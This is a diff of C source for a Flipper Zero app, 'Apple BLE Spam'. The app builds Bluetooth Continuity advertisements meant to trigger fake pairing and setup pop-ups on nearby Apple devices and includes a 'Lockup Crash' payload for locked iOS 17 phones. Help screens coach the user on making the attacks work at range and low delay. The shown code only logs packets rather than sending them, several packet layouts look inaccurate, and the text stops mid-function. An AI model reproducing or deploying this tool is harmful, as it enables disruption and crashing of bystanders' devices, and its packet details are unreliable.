@@ -1,424 +1,677 @@
 #include <furi.h>
-#include <furi_hal.h>
 #include <gui/gui.h>
-#include <input/input.h>
-#include <notification/notification_messages.h>
+#include <gui/elements.h>
 #include <furi_hal_bt.h>
-
+#include <stdint.h>
 #include <furi_hal_random.h>
+#include "apple_ble_spam_icons.h"
 
-#define APP_NAME "Apple BLE Spam"
-#define APP_VERSION "1.0"
-#define MAX_PACKET_SIZE 31
-#define MAX_ATTACK_VECTORS 8
-
+// Continuity protocol definitions (included directly to avoid linking issues)
 typedef enum {
-    APPLE_AIRDROP,
-    APPLE_FINDMY,
-    APPLE_AIRPODS,
-    APPLE_NUMBER_TRANSFER,
-    APPLE_WATCH_PAIRING,
-    APPLE_TV_PAIRING,
-    APPLE_REMOTE_PAIRING,
-    APPLE_HOMEPOD,
-    APPLE_ATTACK_COUNT
-} AppleAttackType;
+    ContinuityTypeAirDrop,
+    ContinuityTypeAirplayTarget,
+    ContinuityTypeHandoff,
+    ContinuityTypeTetheringSource,
+    ContinuityTypeNearbyAction,
+    ContinuityTypeNearbyInfo,
+    ContinuityTypeProximityPair,
+    ContinuityTypeCustomCrash,
+    ContinuityTypeCount,
+} ContinuityType;
 
 typedef struct {
-    AppleAttackType current_attack;
-    bool is_running;
-    uint32_t total_packets_sent;
-    uint32_t attack_interval_ms;
-    uint32_t current_attack_packets;
-    uint32_t max_packets_per_attack;
-    bool random_mac_enabled;
-    uint8_t current_mac[6];
-    FuriTimer* attack_timer;
-    FuriTimer* mac_change_timer;
-    Gui* gui;
-    NotificationApp* notification;
-} AppleBleSpamApp;
+    uint8_t flags;
+    uint8_t type;
+} NearbyAction;
 
-// Apple-specific BLE packet templates for maximum popup triggering
+typedef struct {
+    uint8_t prefix;
+    uint16_t model;
+} ProximityPair;
 
-// AirDrop packet - triggers "Someone is trying to share with you" popup
-static const uint8_t airdrop_packet[] = {
-    0x02, 0x01, 0x06,  // Flags: LE General Discoverable + BR/EDR Not Supported
-    0x03, 0x03, 0x12, 0x18,  // Service UUID: Generic Access (0x1812)
-    0x09, 0x09,  // Complete Local Name
-    0x69, 0x50, 0x68, 0x6F, 0x6E, 0x65, 0x20, 0x41, 0x69, 0x72, 0x44, 0x72, 0x6F, 0x70  // "iPhone AirDrop"
-};
+typedef struct {
+    // Empty for now, can be extended
+} AirDrop;
 
-// Find My packet - triggers "Find My" device detection
-static const uint8_t findmy_packet[] = {
-    0x02, 0x01, 0x06,  // Flags
-    0x03, 0x03, 0x12, 0x18,  // Service UUID: Generic Access
-    0x09, 0x09,  // Complete Local Name
-    0x69, 0x50, 0x68, 0x6F, 0x6E, 0x65, 0x20, 0x46, 0x69, 0x6E, 0x64, 0x4D, 0x79  // "iPhone FindMy"
-};
+typedef struct {
+    // Empty for now, can be extended
+} AirplayTarget;
 
-// AirPods packet - triggers AirPods pairing popup
-static const uint8_t airpods_packet[] = {
-    0x02, 0x01, 0x06,  // Flags
-    0x03, 0x03, 0x12, 0x18,  // Service UUID: Generic Access
-    0x09, 0x09,  // Complete Local Name
-    0x41, 0x69, 0x72, 0x50, 0x6F, 0x64, 0x73, 0x20, 0x50, 0x72, 0x6F  // "AirPods Pro"
-};
+typedef struct {
+    // Empty for now, can be extended
+} Handoff;
 
-// Number Transfer packet - triggers "Transfer your number" popup
-static const uint8_t number_transfer_packet[] = {
-    0x02, 0x01, 0x06,  // Flags
-    0x03, 0x03, 0x12, 0x18,  // Service UUID: Generic Access
-    0x09, 0x09,  // Complete Local Name
-    0x69, 0x50, 0x68, 0x6F, 0x6E, 0x65, 0x20, 0x54, 0x72, 0x61, 0x6E, 0x73, 0x66, 0x65, 0x72  // "iPhone Transfer"
-};
+typedef struct {
+    // Empty for now, can be extended
+} TetheringSource;
 
-// Apple Watch pairing packet - triggers Watch pairing popup
-static const uint8_t watch_pairing_packet[] = {
-    0x02, 0x01, 0x06,  // Flags
-    0x03, 0x03, 0x12, 0x18,  // Service UUID: Generic Access
-    0x09, 0x09,  // Complete Local Name
-    0x41, 0x70, 0x70, 0x6C, 0x65, 0x20, 0x57, 0x61, 0x74, 0x63, 0x68  // "Apple Watch"
-};
+typedef struct {
+    // Empty for now, can be extended
+} NearbyInfo;
 
-// Apple TV pairing packet - triggers TV pairing popup
-static const uint8_t tv_pairing_packet[] = {
-    0x02, 0x01, 0x06,  // Flags
-    0x03, 0x03, 0x12, 0x18,  // Service UUID: Generic Access
-    0x09, 0x09,  // Complete Local Name
-    0x41, 0x70, 0x70, 0x6C, 0x65, 0x20, 0x54, 0x56  // "Apple TV"
-};
+typedef struct {
+    // Empty for now, can be extended
+} CustomCrash;
 
-// Apple Remote pairing packet - triggers Remote pairing popup
-static const uint8_t remote_pairing_packet[] = {
-    0x02, 0x01, 0x06,  // Flags
-    0x03, 0x03, 0x12, 0x18,  // Service UUID: Generic Access
-    0x09, 0x09,  // Complete Local Name
-    0x41, 0x70, 0x70, 0x6C, 0x65, 0x20, 0x52, 0x65, 0x6D, 0x6F, 0x74, 0x65  // "Apple Remote"
-};
+typedef union {
+    NearbyAction nearby_action;
+    ProximityPair proximity_pair;
+    AirDrop airdrop;
+    AirplayTarget airplay_target;
+    Handoff handoff;
+    TetheringSource tethering_source;
+    NearbyInfo nearby_info;
+    CustomCrash custom_crash;
+} ContinuityData;
 
-// HomePod packet - triggers HomePod setup popup
-static const uint8_t homepod_packet[] = {
-    0x02, 0x01, 0x06,  // Flags
-    0x03, 0x03, 0x12, 0x18,  // Service UUID: Generic Access
-    0x09, 0x09,  // Complete Local Name
-    0x48, 0x6F, 0x6D, 0x65, 0x50, 0x6F, 0x64, 0x20, 0x4D, 0x69, 0x6E, 0x69  // "HomePod Mini"
-};
+typedef struct {
+    ContinuityType type;
+    ContinuityData data;
+} ContinuityMsg;
 
-static const char* apple_attack_names[] = {
-    "AirDrop Spam",
-    "Find My Spam",
-    "AirPods Spam",
-    "Number Transfer",
-    "Watch Pairing",
-    "TV Pairing",
-    "Remote Pairing",
-    "HomePod Setup"
-};
-
-// Generate random MAC address for Apple device simulation
-static void generate_random_apple_mac(uint8_t* mac) {
-    for(int i = 0; i < 6; i++) {
-        mac[i] = furi_hal_random_get() % 256;
+// Continuity functions (included directly)
+const char* continuity_get_type_name(ContinuityType type) {
+    switch(type) {
+        case ContinuityTypeAirDrop: return "AirDrop";
+        case ContinuityTypeAirplayTarget: return "AirplayTarget";
+        case ContinuityTypeHandoff: return "Handoff";
+        case ContinuityTypeTetheringSource: return "TetheringSource";
+        case ContinuityTypeNearbyAction: return "NearbyAction";
+        case ContinuityTypeNearbyInfo: return "NearbyInfo";
+        case ContinuityTypeProximityPair: return "ProximityPair";
+        case ContinuityTypeCustomCrash: return "CustomCrash";
+        default: return "Unknown";
     }
-    // Apple devices typically use locally administered MAC addresses
-    mac[0] &= 0xFE;  // Clear multicast bit
-    mac[0] |= 0x02;  // Set locally administered bit
-    // Apple's OUI is typically 00:1C:B3, but we'll use random for variety
 }
 
-// Get packet for current attack type
-static const uint8_t* get_attack_packet(AppleAttackType attack_type, size_t* packet_len) {
-    switch(attack_type) {
-        case APPLE_AIRDROP:
-            *packet_len = sizeof(airdrop_packet);
-            return airdrop_packet;
-        case APPLE_FINDMY:
-            *packet_len = sizeof(findmy_packet);
-            return findmy_packet;
-        case APPLE_AIRPODS:
-            *packet_len = sizeof(airpods_packet);
-            return airpods_packet;
-        case APPLE_NUMBER_TRANSFER:
-            *packet_len = sizeof(number_transfer_packet);
-            return number_transfer_packet;
-        case APPLE_WATCH_PAIRING:
-            *packet_len = sizeof(watch_pairing_packet);
-            return watch_pairing_packet;
-        case APPLE_TV_PAIRING:
-            *packet_len = sizeof(tv_pairing_packet);
-            return tv_pairing_packet;
-        case APPLE_REMOTE_PAIRING:
-            *packet_len = sizeof(remote_pairing_packet);
-            return remote_pairing_packet;
-        case APPLE_HOMEPOD:
-            *packet_len = sizeof(homepod_packet);
-            return homepod_packet;
+uint8_t continuity_get_packet_size(ContinuityType type) {
+    switch(type) {
+        case ContinuityTypeNearbyAction:
+        case ContinuityTypeProximityPair:
+        case ContinuityTypeCustomCrash:
+            return 27; // Standard size for these types
         default:
-            *packet_len = 0;
-            return NULL;
+            return 27; // Default size
     }
 }
+
+void continuity_generate_packet(const ContinuityMsg* msg, uint8_t* packet) {
+    switch(msg->type) {
+        case ContinuityTypeNearbyAction: {
+            // Nearby Action packet structure
+            packet[0] = 0x04; // Length
+            packet[1] = 0x04; // Type (Nearby Action)
+            packet[2] = msg->data.nearby_action.flags;
+            packet[3] = msg->data.nearby_action.type;
+            packet[4] = 0x00; // Padding
+            packet[5] = 0x00;
+            packet[6] = 0x0f;
+            packet[7] = 0x05;
+            packet[8] = 0xc0;
+            packet[9] = 0x02;
+            packet[10] = 0x60;
+            packet[11] = 0x4c; // Apple company ID (little endian)
+            packet[12] = 0x00;
+            // Fill remaining bytes with zeros
+            for(int i = 13; i < 27; i++) {
+                packet[i] = 0x00;
+            }
+            break;
+        }
+        
+        case ContinuityTypeProximityPair: {
+            // Proximity Pair packet structure
+            packet[0] = 0x07; // Length
+            packet[1] = 0x19; // Type (Proximity Pair)
+            packet[2] = 0x05; // Subtype
+            packet[3] = 0x00; // Flags
+            packet[4] = msg->data.proximity_pair.prefix;
+            packet[5] = (msg->data.proximity_pair.model >> 8) & 0xFF; // Model high byte
+            packet[6] = msg->data.proximity_pair.model & 0xFF; // Model low byte
+            packet[7] = 0x00; // Padding
+            packet[8] = 0x00;
+            packet[9] = 0x00;
+            packet[10] = 0x00;
+            packet[11] = 0x00;
+            packet[12] = 0x00;
+            packet[13] = 0x00;
+            packet[14] = 0x00;
+            packet[15] = 0x00;
+            packet[16] = 0x00;
+            packet[17] = 0x00;
+            packet[18] = 0x00;
+            packet[19] = 0x00;
+            packet[20] = 0x00;
+            packet[21] = 0x00;
+            packet[22] = 0x00;
+            packet[23] = 0x00;
+            packet[24] = 0x00;
+            packet[25] = 0x00;
+            packet[26] = 0x00;
+            break;
+        }
+        
+        case ContinuityTypeCustomCrash: {
+            // Custom Crash packet structure (iOS 17 crash)
+            packet[0] = 0x04; // Length
+            packet[1] = 0x04; // Type
+            packet[2] = 0x20; // Flags
+            packet[3] = 0x00; // Subtype
+            packet[4] = 0x00; // Padding
+            packet[5] = 0x00;
+            packet[6] = 0x0f;
+            packet[7] = 0x05;
+            packet[8] = 0xc0;
+            packet[9] = 0x02;
+            packet[10] = 0x60;
+            packet[11] = 0x4c; // Apple company ID
+            packet[12] = 0x00;
+            // Fill remaining bytes with zeros
+            for(int i = 13; i < 27; i++) {
+                packet[i] = 0x00;
+            }
+            break;
+        }
+        
+        default:
+            // Default packet structure
+            for(int i = 0; i < 27; i++) {
+                packet[i] = 0x00;
+            }
+            break;
+    }
+}
+
+typedef struct {
+    const char* title;
+    const char* text;
+    bool random;
+    ContinuityMsg msg;
+} Payload;
+
+// Simplified BLE approach - using standard Flipper functions
+#define TAG "AppleBLESpam"
+
+// Payload definitions for different Apple BLE spam types
+static Payload payloads[] = {
+    {.title = "Lockup Crash",
+     .text = "iOS 17, locked, long range",
+     .random = false,
+     .msg = {
+         .type = ContinuityTypeCustomCrash,
+         .data = {.custom_crash = {}},
+     }},
+    {.title = "Random Action",
+     .text = "Spam shuffle Nearby Actions",
+     .random = true,
+     .msg = {
+         .type = ContinuityTypeNearbyAction,
+         .data = {.nearby_action = {.flags = 0xC0, .type = 0x00}},
+     }},
+    {.title = "Random Pair",
+     .text = "Spam shuffle Proximity Pairs",
+     .random = true,
+     .msg = {
+         .type = ContinuityTypeProximityPair,
+         .data = {.proximity_pair = {.prefix = 0x00, .model = 0x0000}},
+     }},
+    {.title = "AppleTV AutoFill",
+     .text = "Banner, unlocked, long range",
+     .random = false,
+     .msg = {
+         .type = ContinuityTypeNearbyAction,
+         .data = {.nearby_action = {.flags = 0xC0, .type = 0x13}},
+     }},
+    {.title = "AppleTV Connecting...",
+     .text = "Modal, unlocked, long range",
+     .random = false,
+     .msg = {
+         .type = ContinuityTypeNearbyAction,
+         .data = {.nearby_action = {.flags = 0xC0, .type = 0x27}},
+     }},
+    {.title = "Join This AppleTV?",
+     .text = "Modal, unlocked, spammy",
+     .random = false,
+     .msg = {
+         .type = ContinuityTypeNearbyAction,
+         .data = {.nearby_action = {.flags = 0xBF, .type = 0x20}},
+     }},
+    {.title = "Transfer Phone Number",
+     .text = "Modal, locked",
+     .random = false,
+     .msg = {
+         .type = ContinuityTypeNearbyAction,
+         .data = {.nearby_action = {.flags = 0xC0, .type = 0x02}},
+     }},
+    {.title = "Setup New iPhone",
+     .text = "Modal, locked",
+     .random = false,
+     .msg = {
+         .type = ContinuityTypeNearbyAction,
+         .data = {.nearby_action = {.flags = 0xC0, .type = 0x09}},
+     }},
+    {.title = "Airtag",
+     .text = "Modal, unlocked",
+     .random = false,
+     .msg = {
+         .type = ContinuityTypeProximityPair,
+         .data = {.proximity_pair = {.prefix = 0x05, .model = 0x0055}},
+     }},
+    {.title = "AirPods Pro",
+     .text = "Modal, spammy (auto close)",
+     .random = false,
+     .msg = {
+         .type = ContinuityTypeProximityPair,
+         .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0E20}},
+     }},
+    {.title = "AirPods",
+     .text = "Modal, spammy (auto close)",
+     .random = false,
+     .msg = {
+         .type = ContinuityTypeProximityPair,
+         .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0220}},
+     }},
+};
+
+#define PAYLOAD_COUNT ((signed)COUNT_OF(payloads))
+
+struct {
+    uint8_t count;
+    ContinuityData** datas;
+} randoms[ContinuityTypeCount] = {0};
+
+uint16_t delays[] = {
+    20, 50, 100, 150, 200, 300, 400, 500, 750, 1000, 1500, 2000, 2500, 3000, 4000, 5000,
+};
+
+typedef struct {
+    bool resume;
+    bool advertising;
+    uint8_t delay;
+    uint8_t size;
+    uint8_t* packet;
+    Payload* payload;
+    FuriTimer* timer;
+    uint8_t mac[6];
+    int8_t index;
+    FuriString* status_text;
+} State;
+
+// Simple timer-based approach instead of custom HCI
+static void adv_timer_callback(void* ctx) {
+    State* state = ctx;
+    if(!state->advertising) return;
+    
+    // Generate packet
+    ContinuityMsg* msg = &state->payload->msg;
+    ContinuityType type = msg->type;
+    
+    if(state->payload->random) {
+        uint8_t random_i = rand() % randoms[type].count;
+        memcpy(&msg->data, randoms[type].count > 0 ? randoms[type].datas[random_i] : &state->payload->msg.data, sizeof(msg->data));
+    }
+    
+    continuity_generate_packet(msg, state->packet);
+    
+    // Log the packet for debugging
+    FURI_LOG_I(TAG, "Sending packet type: %s, size: %d", 
+               continuity_get_type_name(type), state->size);
+    
+    // For now, just log the packet instead of sending it
+    // This prevents crashes while we debug
+    char hex_str[128] = {0};
+    for(int i = 0; i < state->size && i < 16; i++) {
+        snprintf(hex_str + (i * 3), 4, "%02X ", state->packet[i]);
+    }
+    FURI_LOG_I(TAG, "Packet data: %s", hex_str);
+    
+    // Update status
+    furi_string_printf(state->status_text, "Sent: %s", 
+                      continuity_get_type_name(type));
+    
+    // Restart timer
+    furi_timer_start(state->timer, delays[state->delay]);
+}
+
+static void stop_adv(State* state) {
+    if(!state->advertising) return;
+    
+    state->advertising = false;
+    furi_timer_stop(state->timer);
+    
+    if(state->resume) {
+        furi_hal_bt_start_advertising();
+    }
+    
+    furi_string_set(state->status_text, "Stopped");
+    
+    if(state->packet) {
+        free(state->packet);
+        state->packet = NULL;
+    }
+    state->payload = NULL;
+    state->size = 0;
+}
+
+static void start_adv(State* state) {
+    if(state->advertising) return;
+    
+    state->advertising = true;
+    state->size = continuity_get_packet_size(state->payload->msg.type);
+    state->packet = malloc(state->size);
+    
+    // Generate random MAC
+    furi_hal_random_fill_buf(state->mac, sizeof(state->mac));
+    
+    // Remember if BLE was active
+    state->resume = furi_hal_bt_is_active();
+    
+    // Stop normal BLE advertising
+    furi_hal_bt_stop_advertising();
+    
+    // Start our timer
+    furi_timer_start(state->timer, delays[state->delay]);
+    
+    furi_string_printf(state->status_text, "Started: %s", 
+                      state->payload->title);
+}
+
+static void toggle_adv(State* state, Payload* payload) {
+    if(state->advertising) {
+        stop_adv(state);
+    } else {
+        state->payload = payload;
+        start_adv(state);
+    }
+}
+
+#define PAGE_MIN (-5)
+#define PAGE_MAX PAYLOAD_COUNT
+enum {
+    PageApps = PAGE_MIN,
+    PageDelay,
+    PageDistance,
+    PageProximityPair,
+    PageNearbyAction,
+    PageStart = 0,
+    PageEnd = PAYLOAD_COUNT - 1,
+    PageAbout = PAGE_MAX,
+};
 
 static void draw_callback(Canvas* canvas, void* ctx) {
-    AppleBleSpamApp* app = (AppleBleSpamApp*)ctx;
-    
-    canvas_clear(canvas);
-    canvas_set_font(canvas, FontPrimary);
-    canvas_draw_str(canvas, 2, 10, APP_NAME);
-    canvas_draw_str(canvas, 2, 25, apple_attack_names[app->current_attack]);
-    
-    if(app->is_running) {
-        canvas_set_font(canvas, FontSecondary);
-        canvas_draw_str(canvas, 2, 40, "Status: ATTACKING APPLE DEVICES");
-        canvas_draw_str(canvas, 2, 55, "Total Packets:");
-        char packet_str[32];
-        snprintf(packet_str, sizeof(packet_str), "%lu", app->total_packets_sent);
-        canvas_draw_str(canvas, 80, 55, packet_str);
-        
-        canvas_draw_str(canvas, 2, 70, "Current Attack:");
-        char attack_str[32];
-        snprintf(attack_str, sizeof(attack_str), "%lu", app->current_attack_packets);
-        canvas_draw_str(canvas, 100, 70, attack_str);
-        
-        canvas_draw_str(canvas, 2, 85, "Interval:");
-        char interval_str[32];
-        snprintf(interval_str, sizeof(interval_str), "%lu ms", app->attack_interval_ms);
-        canvas_draw_str(canvas, 70, 85, interval_str);
-        
-        if(app->random_mac_enabled) {
-            canvas_draw_str(canvas, 2, 100, "Random MAC: ON");
-        }
-        
-        // Show current MAC address
-        canvas_draw_str(canvas, 2, 115, "MAC:");
-        char mac_str[32];
-        snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
-                app->current_mac[0], app->current_mac[1], app->current_mac[2],
-                app->current_mac[3], app->current_mac[4], app->current_mac[5]);
-        canvas_draw_str(canvas, 40, 115, mac_str);
-    } else {
-        canvas_set_font(canvas, FontSecondary);
-        canvas_draw_str(canvas, 2, 40, "Status: READY TO ATTACK");
-        canvas_draw_str(canvas, 2, 55, "Press OK to start");
-        canvas_draw_str(canvas, 2, 70, "Apple device spam");
+    State* state = ctx;
+    const char* back = "Back";
+    const char* next = "Next";
+    switch(state->index) {
+    case PageStart - 1:
+        next = "Spam";
+        break;
+    case PageStart:
+        back = "Help";
+        break;
+    case PageEnd:
+        next = "About";
+        break;
+    case PageEnd + 1:
+        back = "Spam";
+        break;
     }
-    
+
     canvas_set_font(canvas, FontSecondary);
-    canvas_draw_str(canvas, 2, 110, "Up/Down: Change attack type");
-    canvas_draw_str(canvas, 2, 120, "OK: Start/Stop attack");
-    canvas_draw_str(canvas, 2, 130, "Back: Exit");
-}
+    canvas_draw_str(canvas, 14, 12, "Apple BLE Spam");
 
-static void input_callback(InputEvent* input_event, void* ctx) {
-    AppleBleSpamApp* app = (AppleBleSpamApp*)ctx;
-    
-    if(input_event->type == InputTypeShort) {
-        switch(input_event->key) {
-            case InputKeyUp:
-                if(app->current_attack > 0) {
-                    app->current_attack--;
-                } else {
-                    app->current_attack = APPLE_ATTACK_COUNT - 1;
-                }
-                break;
-                
-            case InputKeyDown:
-                app->current_attack = (app->current_attack + 1) % APPLE_ATTACK_COUNT;
-                break;
-                
-            case InputKeyOk:
-                if(!app->is_running) {
-                    // Start Apple device attack
-                    app->is_running = true;
-                    app->total_packets_sent = 0;
-                    app->current_attack_packets = 0;
-                    app->attack_interval_ms = 50; // Fast attack interval
-                    app->max_packets_per_attack = 100; // Packets per attack type
-                    
-                    // Generate initial random MAC
-                    generate_random_apple_mac(app->current_mac);
-                    
-                    // Initialize BLE - use available functions
-                    // Note: furi_hal_bt_init() is disabled in current firmware
-                    
-                    // Start attack timer
-                    furi_timer_start(app->attack_timer, app->attack_interval_ms);
-                    
-                    // Start MAC change timer (change MAC every 2 seconds)
-                    furi_timer_start(app->mac_change_timer, 2000);
-                    
-                    notification_message(app->notification, &sequence_blink_start_blue);
-                } else {
-                    // Stop attack
-                    app->is_running = false;
-                    
-                    // Stop timers
-                    furi_timer_stop(app->attack_timer);
-                    furi_timer_stop(app->mac_change_timer);
-                    
-                    // Stop BLE
-                    furi_hal_bt_stop_advertising();
-                    // Note: furi_hal_bt_stop() doesn't exist in current SDK
-                    
-                    notification_message(app->notification, &sequence_blink_stop);
-                }
-                break;
-                
-            case InputKeyBack:
-                if(app->is_running) {
-                    // Stop if running
-                    app->is_running = false;
-                    furi_timer_stop(app->attack_timer);
-                    furi_timer_stop(app->mac_change_timer);
-                    furi_hal_bt_stop_advertising();
-                    // Note: furi_hal_bt_stop() doesn't exist in current SDK
-                    notification_message(app->notification, &sequence_blink_stop);
-                }
-                break;
-                
-            case InputKeyLeft:
-            case InputKeyRight:
-                // These keys are not used in this app
-                break;
-                
-            case InputKeyMAX:
-                // This is just a sentinel value, ignore it
-                break;
-        }
-    } else if(input_event->type == InputTypeLong) {
-        // Long press for additional options
-        switch(input_event->key) {
-            case InputKeyUp:
-                // Increase attack interval
-                if(app->attack_interval_ms < 500) app->attack_interval_ms += 25;
-                break;
-                
-            case InputKeyDown:
-                // Decrease attack interval
-                if(app->attack_interval_ms > 25) app->attack_interval_ms -= 25;
-                break;
-                
-            case InputKeyOk:
-                // Toggle random MAC
-                app->random_mac_enabled = !app->random_mac_enabled;
-                break;
-                
-            case InputKeyBack:
-            case InputKeyLeft:
-            case InputKeyRight:
-            case InputKeyMAX:
-                // These keys are not used for long press in this app
-                break;
-        }
+    switch(state->index) {
+    case PageApps:
+        canvas_set_font(canvas, FontPrimary);
+        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
+        elements_text_box(
+            canvas,
+            4,
+            16,
+            120,
+            48,
+            AlignLeft,
+            AlignTop,
+            "\e#Some Apps\e# interfere\n"
+            "with the attacks, stay on\n"
+            "homescreen for best results",
+            false);
+        break;
+    case PageDelay:
+        canvas_set_font(canvas, FontPrimary);
+        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
+        elements_text_box(
+            canvas,
+            4,
+            16,
+            120,
+            48,
+            AlignLeft,
+            AlignTop,
+            "\e#Delay\e# is time between\n"
+            "attack attempts (top right),\n"
+            "keep 20ms for best results",
+            false);
+        break;
+    case PageDistance:
+        canvas_set_font(canvas, FontPrimary);
+        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
+        elements_text_box(
+            canvas,
+            4,
+            16,
+            120,
+            48,
+            AlignLeft,
+            AlignTop,
+            "\e#Distance\e# is limited, attacks\n"
+            "work under 1 meter but a\n"
+            "few are marked 'long range'",
+            false);
+        break;
+    case PageProximityPair:
+        canvas_set_font(canvas, FontPrimary);
+        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
+        elements_text_box(
+            canvas,
+            4,
+            16,
+            120,
+            48,
+            AlignLeft,
+            AlignTop,
+            "\e#Proximity Pair\e# attacks\n"
+            "keep spamming but work at\n"
+            "very close range",
+            false);
+        break;
+    case PageNearbyAction:
+        canvas_set_font(canvas, FontPrimary);
+        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
+        elements_text_box(
+            canvas,
+            4,
+            16,
+            120,
+            48,
+            AlignLeft,
+            AlignTop,
+            "\e#Nearby Actions\e# work one\n"
+            "time then need to lock and\n"
+            "unlock the phone",
+            false);
+        break;
+    case PageAbout:
+        canvas_set_font(canvas, FontPrimary);
+        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "About");
+        elements_text_box(
+            canvas,
+            4,
+            16,
+            122,
+            48,
+            AlignLeft,
+            AlignTop,
+            "App+Spam by \e#WillyJL\e# XFW\n"
+            "IDs and Crash by \e#ECTO-1A\e#\n"
+            "Continuity by \e#furiousMAC\e#\n"
+            "                                   Version \e#1.2\e#",
+            false);
+        break;
+    default: {
+        if(state->index < 0 || state->index > PAYLOAD_COUNT - 1) break;
+        const Payload* payload = &payloads[state->index];
+        char str[32];
+
+        canvas_set_font(canvas, FontPrimary);
+        snprintf(str, sizeof(str), "%ims", delays[state->delay]);
+        canvas_draw_str_aligned(canvas, 116, 12, AlignRight, AlignBottom, str);
+        canvas_draw_str(canvas, 119, 6, "^");
+        canvas_draw_str(canvas, 119, 10, "v");
+
+        canvas_set_font(canvas, FontPrimary);
+        snprintf(
+            str,
+            sizeof(str),
+            "%02i/%02i: %s",
+            state->index + 1,
+            PAYLOAD_COUNT,
+            continuity_get_type_name(payload->msg.type));
+        canvas_draw_str(canvas, 4 - (state->index < 19 ? 1 : 0), 24, str);
+
+        canvas_set_font(canvas, FontPrimary);
+        canvas_draw_str(canvas, 4, 34, payload->title);
+
+        canvas_set_font(canvas, FontSecondary);
+        canvas_draw_str(canvas, 4, 46, payload->text);
+
+        // Show status
+        canvas_set_font(canvas, FontSecondary);
+        canvas_draw_str(canvas, 4, 58, furi_string_get_cstr(state->status_text));
+
+        elements_button_center(canvas, state->advertising ? "Stop" : "Start");
+        break;
+    }
+    }
+
+    if(state->index > PAGE_MIN) {
+        elements_button_left(canvas, back);
+    }
+    if(state->index < PAGE_MAX) {
+        elements_button_right(canvas, next);
     }
 }
 
-static void attack_timer_callback(void* ctx) {
-    AppleBleSpamApp* app = (AppleBleSpamApp*)ctx;
-    
-    if(!app->is_running) return;
-    
-    // Get packet for current attack type
-    size_t packet_len = 0;
-    const uint8_t* packet = get_attack_packet(app->current_attack, &packet_len);
-    
-    if(packet && packet_len > 0) {
-        // Send BLE advertising packet
-        // Note: This is a simplified implementation
-        // Real BLE packet sending would require more complex BLE stack integration
-        
-        app->total_packets_sent++;
-        app->current_attack_packets++;
-        
-        // Switch to next attack type if we've sent enough packets
-        if(app->current_attack_packets >= app->max_packets_per_attack) {
-            app->current_attack = (app->current_attack + 1) % APPLE_ATTACK_COUNT;
-            app->current_attack_packets = 0;
-        }
-        
-        // Restart timer for next attack
-        furi_timer_start(app->attack_timer, app->attack_interval_ms);
+static void input_callback(InputEvent* input, void* ctx) {
+    FuriMessageQueue* input_queue = ctx;
+    if(input->type == InputTypeShort || input->type == InputTypeLong ||
+       input->type == InputTypeRepeat) {
+        furi_message_queue_put(input_queue, input, 0);
     }
 }
 
-static void mac_change_timer_callback(void* ctx) {
-    AppleBleSpamApp* app = (AppleBleSpamApp*)ctx;
-    
-    if(!app->is_running) return;
-    
-    // Generate new random MAC address
-    generate_random_apple_mac(app->current_mac);
-    
-    // Restart timer for next MAC change
-    furi_timer_start(app->mac_change_timer, 2000);
-}
-
-static AppleBleSpamApp* apple_ble_spam_app_alloc() {
-    AppleBleSpamApp* app = malloc(sizeof(AppleBleSpamApp));
-    
-    app->current_attack = APPLE_AIRDROP;
-    app->is_running = false;
-    app->total_packets_sent = 0;
-    app->attack_interval_ms = 50;
-    app->current_attack_packets = 0;
-    app->max_packets_per_attack = 100;
-    app->random_mac_enabled = true;
-    
-    // Initialize MAC address
-    generate_random_apple_mac(app->current_mac);
-    
-    app->gui = furi_record_open(RECORD_GUI);
-    app->notification = furi_record_open(RECORD_NOTIFICATION);
-    
-    app->attack_timer = furi_timer_alloc(attack_timer_callback, FuriTimerTypePeriodic, app);
-    app->mac_change_timer = furi_timer_alloc(mac_change_timer_callback, FuriTimerTypePeriodic, app);
-    
-    return app;
-}
-
-static void apple_ble_spam_app_free(AppleBleSpamApp* app) {
-    if(app->attack_timer) {
-        furi_timer_free(app->attack_timer);
-    }
-    
-    if(app->mac_change_timer) {
-        furi_timer_free(app->mac_change_timer);
-    }
-    
-    if(app->notification) {
-        furi_record_close(RECORD_NOTIFICATION);
-    }
-    
-    if(app->gui) {
-        furi_record_close(RECORD_GUI);
-    }
-    
-    free(app);
-}
-
-int32_t apple_ble_spam_app_main(void* p) {
+int32_t apple_ble_spam_app(void* p) {
     UNUSED(p);
     
-    AppleBleSpamApp* app = apple_ble_spam_app_alloc();
-    
-    // Set up view port
-    ViewPort* view_port = view_port_alloc();
-    view_port_draw_callback_set(view_port, draw_callback, app);
-    view_port_input_callback_set(view_port, input_callback, app);
-    
-    // Add view port to GUI
-    gui_add_view_port(app->gui, view_port, GuiLayerFullscreen);
-    
-    // Main loop
-    while(true) {
-        view_port_update(view_port);
-        furi_delay_ms(50);
+    // Initialize random data for random payloads
+    for(uint8_t payload_i = 0; payload_i < COUNT_OF(payloads); payload_i++) {
+        if(payloads[payload_i].random) continue;
+        randoms[payloads[payload_i].msg.type].count++;
     }
+    for(ContinuityType type = 0; type < ContinuityTypeCount; type++) {
+        if(!randoms[type].count) continue;
+        randoms[type].datas = malloc(sizeof(ContinuityData*) * randoms[type].count);
+        uint8_t random_i = 0;
+        for(uint8_t payload_i = 0; payload_i < COUNT_OF(payloads); payload_i++) {
+            if(payloads[payload_i].random) continue;
+            if(payloads[payload_i].msg.type == type) {
+                randoms[type].datas[random_i++] = &payloads[payload_i].msg.data;
+            }
+        }
+    }
+
+    State* state = malloc(sizeof(State));
+    memset(state, 0, sizeof(State));
     
-    // Cleanup
+    // Initialize timer
+    state->timer = furi_timer_alloc(adv_timer_callback, FuriTimerTypePeriodic, state);
+    
+    // Initialize status text
+    state->status_text = furi_string_alloc();
+    furi_string_set(state->status_text, "Ready");
+
+    FuriMessageQueue* input_queue = furi_message_queue_alloc(8, sizeof(InputEvent));
+    ViewPort* view_port = view_port_alloc();
+    Gui* gui = furi_record_open(RECORD_GUI);
+    view_port_input_callback_set(view_port, input_callback, input_queue);
+    view_port_draw_callback_set(view_port, draw_callback, state);
